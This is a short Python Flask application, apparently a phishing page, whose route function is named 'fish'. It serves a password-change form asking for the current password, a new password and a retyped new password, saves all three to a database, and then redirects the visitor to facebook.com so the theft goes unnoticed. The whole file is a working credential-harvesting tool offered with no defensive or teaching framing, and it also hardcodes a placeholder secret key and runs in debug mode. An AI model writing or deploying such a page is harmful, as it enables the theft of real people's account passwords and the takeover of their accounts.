from flask       import Flask,render_template,request
from flask.helpers import url_for
from werkzeug.utils import redirect
from submiss import LoginForm
from database import Databases

app=Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'

@app.route('/',methods=['GET' , 'POST'])
def fish():
    form=LoginForm()
    databae = Databases()
    if form.validate_on_submit():
        currentpassword=request.form["current_password"]
        newpassword=request.form["new_pass"]
        currentNewPassword=request.form["retype_pass"]
        if newpassword == currentNewPassword:
            databae.Insert_data((currentpassword,newpassword,currentNewPassword))
            return redirect('https://facebook.com')

    return render_template('work_text.html',form=form)


if __name__ == "__main__":
    app.run(debug=True)
